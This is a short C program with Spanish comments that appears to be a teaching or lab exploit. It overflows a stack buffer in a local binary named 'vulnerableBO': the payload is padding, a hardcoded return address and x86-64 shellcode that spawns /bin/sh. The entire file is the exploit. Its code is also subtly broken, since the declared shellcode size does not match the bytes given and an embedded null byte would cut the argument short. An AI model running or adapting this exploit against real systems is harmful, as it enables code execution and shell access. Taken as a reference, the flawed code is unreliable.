#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define OFFSET 64 // Tamaño del búfer en el programa vulnerable
#define SHELLCODE_SIZE 25 // Tamaño del shellcode


int main() {
	// Shellcode para ejecutar /bin/sh
	unsigned char shellcode[] =
	"\x48\x31\xc0"
    "\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

    // Dirección donde se encuentra el shellcode
    unsigned long ret_address = 0x7fffffffe1f8;
    
    char payload[OFFSET + sizeof(ret_address) + SHELLCODE_SIZE];

    memset(payload, 'A', OFFSET); // Relleno hasta el offset
    memcpy(payload + OFFSET, &ret_address, sizeof(ret_address)); // Sobrescribir la dirección de return 
    memcpy(payload + OFFSET + sizeof(ret_address), shellcode, SHELLCODE_SIZE); // Añadir el shellcode
    // printf("direccion de shellcode %p\n",&payload);

    // Ejecutar el programa vulnerable con la cadena de ataque como argumento
    char *args[] = {"./vulnerableBO", payload, NULL};
    execve(args[0], args, NULL);

    return 0;
}

